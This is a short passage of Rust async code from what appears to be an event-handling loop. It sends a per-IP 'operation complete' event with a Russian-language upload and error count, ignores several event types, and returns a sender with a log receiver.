                            let _ = tx_t.send(HyperionEvent::OperationComplete { ip, result: format!("{}/{} загружено, {} ошибок", ok, total, fail) }).await;
                        });
                    }

                    HyperionEvent::OperationComplete { .. } | HyperionEvent::OperationFailed { .. } | HyperionEvent::NexusLog { .. } => {}
                }
            }
        });
        (Self { tx }, log_rx)
    }
}
